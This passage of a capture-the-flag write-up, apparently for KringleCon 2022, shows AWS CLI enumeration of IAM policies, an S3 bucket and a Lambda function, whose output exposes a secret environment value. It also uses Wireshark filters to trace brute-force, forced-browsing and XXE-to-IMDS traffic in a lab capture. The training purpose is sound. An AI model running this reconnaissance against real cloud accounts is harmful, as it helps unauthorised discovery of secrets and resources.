</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;PolicyName&#34;</span>: <span style=color:#e6db74>&#34;TIER1_READONLY_POLICY&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;PolicyArn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;IsTruncated&#34;</span>: <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now we are asked to <code>get</code> the policy attached to our user. We will use the <code>get-policy</code> subcommand and supply the value of the <code>PolicyArn</code> field from the previous output to the <code>--policy-arn</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws iam get-policy <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--policy-arn <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Policy&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;PolicyName&#34;</span>: <span style=color:#e6db74>&#34;TIER1_READONLY_POLICY&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;PolicyId&#34;</span>: <span style=color:#e6db74>&#34;ANPAYYOROBUERT7TGKUHA&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;Path&#34;</span>: <span style=color:#e6db74>&#34;/&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;DefaultVersionId&#34;</span>: <span style=color:#e6db74>&#34;v1&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;AttachmentCount&#34;</span>: <span style=color:#ae81ff>11</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;PermissionsBoundaryUsageCount&#34;</span>: <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;IsAttachable&#34;</span>: <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;Description&#34;</span>: <span style=color:#e6db74>&#34;Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;CreateDate&#34;</span>: <span style=color:#e6db74>&#34;2022-06-21 22:02:30+00:00&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;UpdateDate&#34;</span>: <span style=color:#e6db74>&#34;2022-06-21 22:10:29+00:00&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;Tags&#34;</span>: []
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We need to view the default version of the policy.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws iam get-policy-version <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--policy-arn <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--version-id v1
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;PolicyVersion&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;Document&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Version&#34;</span>: <span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Effect&#34;</span>: <span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;lambda:ListFunctions&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;lambda:GetFunctionUrlConfig&#34;</span>
</span></span><span style=display:flex><span>                    ],
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Resource&#34;</span>: <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Effect&#34;</span>: <span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;iam:GetUserPolicy&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;iam:ListUserPolicies&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;iam:ListAttachedUserPolicies&#34;</span>
</span></span><span style=display:flex><span>                    ],
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Resource&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:user/${aws:username}&#34;</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Effect&#34;</span>: <span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;iam:GetPolicy&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;iam:GetPolicyVersion&#34;</span>
</span></span><span style=display:flex><span>                    ],
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Resource&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY&#34;</span>
</span></span><span style=display:flex><span>                },
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Effect&#34;</span>: <span style=color:#e6db74>&#34;Deny&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Principal&#34;</span>: <span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;lambda:Invoke*&#34;</span>
</span></span><span style=display:flex><span>                    ],
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Resource&#34;</span>: <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            ]
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;VersionId&#34;</span>: <span style=color:#e6db74>&#34;v1&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;IsDefaultVersion&#34;</span>: <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;CreateDate&#34;</span>: <span style=color:#e6db74>&#34;2022-06-21 22:02:30+00:00&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We are asked to use the AWS CLI to list the inline policies associated with our user, policies that are unique to a particular identity or resource.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws iam list-user-policies --user-name haug
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;PolicyNames&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;S3Perms&#34;</span>
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;IsTruncated&#34;</span>: <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We will <code>get</code> this policy using the <code>get-user-policy</code> subcommand.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws iam get-user-policy --user-name haug --policy-name S3Perms
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;UserPolicy&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;UserName&#34;</span>: <span style=color:#e6db74>&#34;haug&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;PolicyName&#34;</span>: <span style=color:#e6db74>&#34;S3Perms&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;PolicyDocument&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Version&#34;</span>: <span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Statement&#34;</span>: [
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Effect&#34;</span>: <span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Action&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;s3:ListObjects&#34;</span>
</span></span><span style=display:flex><span>                    ],
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Resource&#34;</span>: [
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;arn:aws:s3:::smogmachines3&#34;</span>,
</span></span><span style=display:flex><span>                        <span style=color:#e6db74>&#34;arn:aws:s3:::smogmachines3/*&#34;</span>
</span></span><span style=display:flex><span>                    ]
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            ]
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;IsTruncated&#34;</span>: <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The inline user policy named S3Perms disclosed the name of an S3 bucket we have permissions to list objects. Let&rsquo;s list those objects!</p><p>We know the S3 bucket&rsquo;s name from the <code>Resource</code> field to be <code>smogmachines3</code>. We&rsquo;ll use the <code>list-objects</code> subcommand of the <code>aws s3api</code> command and supply the bucket&rsquo;s name to the <code>--bucket</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws s3api list-objects --bucket smogmachines3
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;IsTruncated&#34;</span>: <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Marker&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Contents&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;coal-fired-power-station.jpg&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-23 20:40:44+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;1c70c98bebaf3cff781a8fd3141c2945\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Size&#34;</span>: <span style=color:#ae81ff>59312</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Owner&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;DisplayName&#34;</span>: <span style=color:#e6db74>&#34;grinchum&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;ID&#34;</span>: <span style=color:#e6db74>&#34;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;industry-smog.png&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-23 20:40:47+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;c0abe5cb56b7a33d39e17f430755e615\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Size&#34;</span>: <span style=color:#ae81ff>272528</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Owner&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;DisplayName&#34;</span>: <span style=color:#e6db74>&#34;grinchum&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;ID&#34;</span>: <span style=color:#e6db74>&#34;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;smog-power-station.jpg&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-23 20:40:46+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;0e69b8d53d97db0db9f7de8663e9ec09\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Size&#34;</span>: <span style=color:#ae81ff>32498</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Owner&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;DisplayName&#34;</span>: <span style=color:#e6db74>&#34;grinchum&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;ID&#34;</span>: <span style=color:#e6db74>&#34;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-26 16:31:33+00:00&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;fd5d6ab630691dfe56a3fc2fcfb68763\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Size&#34;</span>: <span style=color:#ae81ff>5823</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Owner&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;DisplayName&#34;</span>: <span style=color:#e6db74>&#34;grinchum&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;ID&#34;</span>: <span style=color:#e6db74>&#34;15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Name&#34;</span>: <span style=color:#e6db74>&#34;smogmachines3&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Prefix&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;MaxKeys&#34;</span>: <span style=color:#ae81ff>1000</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;EncodingType&#34;</span>: <span style=color:#e6db74>&#34;url&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The attached user policy provide us several Lambda privileges. We are instructed to use the AWS CLI to list Lambda functions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws lambda list-functions
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Functions&#34;</span>: [
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;FunctionName&#34;</span>: <span style=color:#e6db74>&#34;smogmachine_lambda&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;FunctionArn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Runtime&#34;</span>: <span style=color:#e6db74>&#34;python3.9&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Role&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:role/smogmachine_lambda&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Handler&#34;</span>: <span style=color:#e6db74>&#34;handler.lambda_handler&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;CodeSize&#34;</span>: <span style=color:#ae81ff>2126</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Description&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Timeout&#34;</span>: <span style=color:#ae81ff>600</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;MemorySize&#34;</span>: <span style=color:#ae81ff>256</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2022-09-07T19:28:23.634+0000&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;CodeSha256&#34;</span>: <span style=color:#e6db74>&#34;GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Version&#34;</span>: <span style=color:#e6db74>&#34;$LATEST&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;VpcConfig&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;SubnetIds&#34;</span>: [
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;subnet-8c80a9cb8b3fa5505&#34;</span>
</span></span><span style=display:flex><span>                ],
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;SecurityGroupIds&#34;</span>: [
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;sg-b51a01f5b4711c95c&#34;</span>
</span></span><span style=display:flex><span>                ],
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;VpcId&#34;</span>: <span style=color:#e6db74>&#34;vpc-85ea8596648f35e00&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Environment&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;Variables&#34;</span>: {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;LAMBDASECRET&#34;</span>: <span style=color:#e6db74>&#34;975ceab170d61c75&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;LOCALMNTPOINT&#34;</span>: <span style=color:#e6db74>&#34;/mnt/smogmachine_files&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;TracingConfig&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;Mode&#34;</span>: <span style=color:#e6db74>&#34;PassThrough&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;RevisionId&#34;</span>: <span style=color:#e6db74>&#34;7e198c3c-d4ea-48dd-9370-e5238e9ce06e&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;FileSystemConfigs&#34;</span>: [
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap-db3277b03c6e975d2&#34;</span>,
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;LocalMountPath&#34;</span>: <span style=color:#e6db74>&#34;/mnt/smogmachine_files&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;PackageType&#34;</span>: <span style=color:#e6db74>&#34;Zip&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Architectures&#34;</span>: [
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;x86_64&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;EphemeralStorage&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;Size&#34;</span>: <span style=color:#ae81ff>512</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We will use the AWS CLI to get the configuration containing the public URL of the Lambda function, which as seen from line 4 of the previous output is <code>smogmachine_lambda</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws lambda get-function-url-config --function-name smogmachine_lambda
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;FunctionUrl&#34;</span>: <span style=color:#e6db74>&#34;https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;FunctionArn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;AuthType&#34;</span>: <span style=color:#e6db74>&#34;AWS_IAM&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Cors&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;AllowCredentials&#34;</span>: <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;AllowHeaders&#34;</span>: [],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;AllowMethods&#34;</span>: [
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;GET&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;POST&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;AllowOrigins&#34;</span>: [
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;ExposeHeaders&#34;</span>: [],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;MaxAge&#34;</span>: <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;CreationTime&#34;</span>: <span style=color:#e6db74>&#34;2022-09-07T19:28:23.808713Z&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;LastModifiedTime&#34;</span>: <span style=color:#e6db74>&#34;2022-09-07T19:28:23.808713Z&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>That marks the end of this challenge exploiting AWS misconfigurations.</p><h3 id=naughty-ip>Naughty IP</h3><p>We are given <code>boriaArtifacts.zip</code> which we download and unzip. From it, we open up the <code>victim.pcap</code> file in wireshark. We are supposed to find the top talker after the victim server <code>10.12.42.16</code> itself. It is claimed that this IP address has been acting naughty. In wireshark, we go to <code>Statistics</code> > <code>IPv4 Statistics</code> > <code>All Addresses</code>.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-53-37.png alt=Screenshot-from-2022-12-11-20-53-37.png></p><p>We sort by the column of packet <code>Count</code> in descending order.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-55-33.png alt=Screenshot-from-2022-12-11-20-55-33.png></p><p>Second to our victim server, we see the IP address <code>18.222.86.32</code> which is the answer to this challenge.</p><h3 id=credential-mining>Credential Mining</h3><p>As a continuation to the previous challenge, we are told that the first attack is a brute force login. We are instructed to find the first username tried. In wireshark, we use the filter <code>http.request.method==POST</code> and look at the first filetered packet (7279).</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-58-32.png alt=Screenshot-from-2022-12-11-20-58-32.png></p><p>In the HTML form URL encoded field, we notice the username &ldquo;alice&rdquo;, the answer to this challenge.</p><h3 id=404-ftw>404 FTW</h3><p>With the same PCAP file, we are asked to examine the next attack which is forced browsing where the naughty one is guessing URLs. We are asked to find the first successful URL path in this attack. With wireshark we filter on <code>http.request.method==GET</code>. This returns the HTTP requests where the method is <code>GET</code>.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-00-26.png alt=Screenshot-from-2022-12-11-21-00-26.png></p><p>We start noticing a lot of random looking URL paths from time 175.37 seconds. Now, we filter on <code>http.response.code==200 && frame.time_relative > 175.37</code>. This shows us all the HTTP responses which had a status code of 200 (<code>OK</code>) after the relative time frame of 175.37 seconds.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-02-41.png alt=Screenshot-from-2022-12-11-21-02-41.png></p><p>After around 7 entries (remember, another endpoint was simultaneously requesting for <code>login.html</code> and <code>admin.html</code>), we see that packet 26774 has an HTTP response with status code 200 and the request URI <code>http://www.toteslegit.us/proc</code>. Thus, our answer is <code>/proc</code>.</p><h3 id=imds-xxe-and-other-abbreviations>IMDS, XXE, and Other Abbreviations</h3><p>Continuing the previous exercise, the attacker used XXE to get secret keys from the IMDS service. We are asked to find the URL the attacker forced the server to fetch. Alabaster Snowball gives us the hint that AWS uses a specific IP address to access IMDS which only appears twice in this PCAP. This IP address is <code>169.254.169.254</code> which we can search by using the wireshark filter <code>ip.addr == 169.254.169.254</code>. We use the additional filter of a <code>200 OK</code> response code for valid responses. So, the filter becomes:</p><pre tabindex=0><code>ip.addr == 169.254.169.254 &amp;&amp; http.response.code==200
